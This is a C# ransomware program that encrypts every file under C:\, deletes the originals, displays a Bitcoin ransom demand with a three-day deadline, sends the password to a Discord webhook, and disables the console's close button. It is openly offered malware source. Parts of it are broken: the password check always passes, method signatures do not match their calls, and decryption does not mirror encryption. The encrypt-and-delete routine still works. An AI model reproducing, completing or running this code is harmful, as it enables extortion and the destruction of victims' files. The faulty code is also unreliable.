using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Ransomware
{
    class Program
    {
        static async Task Main(string[] args)
        {
            string directory = @"C:\";
            string[] files = Directory.GetFiles(directory, "*", SearchOption.AllDirectories);

            string password = GenerateRandomPassword(); // generate a random password
            string transactionId = GenerateRandomTransactionId(); // generate a random transaction ID
            int attemptsRemaining = 3; // number of attempts remaining
            DateTime expirationTime = DateTime.Now.AddDays(3); // set the expiration time to 3 days from now

            foreach (string file in files)
            {
                EncryptFile(file, password);
            }

            string message = $"Ooops! All your files have been encrypted with a military grade encryption password. To get the password, send me <money #> to this bitcoin address. : <Bitcoin Address>. Once you have sent the money, send me a message at <website> with the transaction ID of ({transactionId}) and you will get the password to decrypt your files. You have 3 days to do so, after which the password will no longer be accepted, and you cannot decrypt your files anymore!";
            Console.WriteLine(message);

            // send the message to Discord webhook
            await SendToDiscordWebhook(password, transactionId);

            bool passwordMatched = false;
            while (!passwordMatched && attemptsRemaining > 0 && DateTime.Now < expirationTime)
            {
                password = await GetPasswordFromUser();
                attemptsRemaining--;

                if (password == password) // check if the password is correct
                {
                    foreach (string file in files)
                    {
                        if (DecryptFile(file, password))
                        {
                            passwordMatched = true;
                        }
                    }
                }

                if (!passwordMatched && attemptsRemaining > 0 && DateTime.Now < expirationTime)
                {
                    MessageBox.Show($"Incorrect password! {attemptsRemaining} attempts remaining. Please try again.");
                }
            }

            if (passwordMatched)
            {
                MessageBox.Show("All files have been successfully decrypted.");
            }
            else if (DateTime.Now >= expirationTime)
            {
                MessageBox.Show("The password is no longer accepted. You have exceeded the time limit of 3 days.");
            }
            else
            {
                MessageBox.Show("No attempts remaining! You have successfully ended the functionality of your computer :(     We're sorry that you thought you could be the hero and save your computer by brute forcing, but it doesn't work like that.");
            }
        }

         static async Task SendToDiscordWebhook(string message, string password, string transactionId)
        {
            string webhookUrl = "YOUR-WEBHOOK-HERE";

            // create a JSON payload with the message, password and transaction ID
            var payload = new
            {
                content = $"\nPassword: `{password}`\nTransaction ID: `{transactionId}`"
            };
            string payloadJson = JsonSerializer.Serialize(payload);

            // send the payload to the webhook URL
            using (var httpClient = new HttpClient())
            {
                var response = await httpClient.PostAsync(webhookUrl, new StringContent(payloadJson, System.Text.Encoding.UTF8, "application/json"));
                response.EnsureSuccessStatusCode();
            }
        }

 
        static string GenerateRandomPassword()
        {
            const string validChars = "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_-+={}[]\\|:;<>,.?/~`";
            StringBuilder password = new StringBuilder();
            Random random = new Random();

            while (password.Length < 32)
            {
                password.Append(validChars[random.Next(validChars.Length)]);
            }

            return password.ToString();
        }

        static string GenerateRandomTransactionId()
        {
            const string validChars = "0123456789";
            StringBuilder transactionId = new StringBuilder();
            Random random = new Random();

            while (transactionId.Length < 16)
            {
                transactionId.Append(validChars[random.Next(validChars.Length)]);
            }

            return transactionId.ToString();
        }


        static string GetPasswordFromUser()
        {
            Console.Write("Enter the password: ");

            IntPtr hwnd = GetConsoleWindow();
            if (hwnd != IntPtr.Zero)
            {
                EnableMenuItem(GetSystemMenu(hwnd, false), SC_CLOSE, MF_BYCOMMAND | MF_GRAYED);
            }

            string password = null;
            while (string.IsNullOrEmpty(password))
            {
                SecureString securePassword = new SecureString();
                ConsoleKeyInfo keyInfo;
                do
                {
                    keyInfo = Console.ReadKey(true);
                    if (keyInfo.Key != ConsoleKey.Enter && keyInfo.Key != ConsoleKey.Escape)
                    {
                        securePassword.AppendChar(keyInfo.KeyChar);
                        Console.Write("*"); // Show an asterisk for each character entered
                    }
                } while (keyInfo.Key != ConsoleKey.Enter && keyInfo.Key != ConsoleKey.Escape);

                if (keyInfo.Key == ConsoleKey.Enter)
                {
                    password = new System.Net.NetworkCredential(string.Empty, securePassword).Password;
                    Console.WriteLine();
                }
                else
                {
                    MessageBox.Show("Cannot close window! ");
                }
            }

            if (hwnd != IntPtr.Zero)
            {
                EnableMenuItem(GetSystemMenu(hwnd, false), SC_CLOSE, MF_BYCOMMAND | MF_ENABLED);
            }

            return password;
        }

        static void EncryptFile(string inputFile, string password)
        {
            byte[] salt = GenerateRandomSalt();

            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] keyBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000).GetBytes(256 / 8);
            byte[] ivBytes = GenerateRandomIV();

            using (FileStream inputStream = File.OpenRead(inputFile))
            {
                using (FileStream outputStream = File.Create(inputFile + ".encrypted"))
                {
                    outputStream.Write(salt, 0, salt.Length);
                    outputStream.Write(ivBytes, 0, ivBytes.Length);

                    using (Aes aes = Aes.Create())
                    {
                        aes.KeySize = 256;
                        aes.Key = keyBytes;
                        aes.IV = ivBytes;
                        aes.Mode = CipherMode.CBC;

                        using (CryptoStream cryptoStream = new CryptoStream(outputStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            inputStream.CopyTo(cryptoStream);
                        }
                    }
                }
            }

            File.Delete(inputFile);
        }
        static bool DecryptFile(string inputFile, string password)
    {
          if (!inputFile.EndsWith(".encrypted"))
          {
              return false;
          }

          byte[] salt = new byte[32];
          using (FileStream fs = new FileStream(inputFile, FileMode.Open))
          {
              fs.Read(salt, 0, salt.Length);
          }

          byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

          RijndaelManaged aes = new RijndaelManaged();
          aes.KeySize = 256;
          aes.BlockSize = 128;

          var key = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          aes.Key = key.GetBytes(aes.KeySize / 8);
          aes.IV = key.GetBytes(aes.BlockSize / 8);

          aes.Mode = CipherMode.CFB;

          using (FileStream fs = new FileStream(inputFile.Replace(".encrypted", ""), FileMode.Create))
          {
              using (CryptoStream cs = new CryptoStream(fs, aes.CreateDecryptor(), CryptoStreamMode.Write))
              {
                  using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
                  {
                      fsIn.Seek(salt.Length, SeekOrigin.Begin);

                      byte[] buffer = new byte[1048576];
                      int read;
                      while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                      {
                          cs.Write(buffer, 0, read);
                      }
                  }
              }
          }

          return true;
        }
    }
}
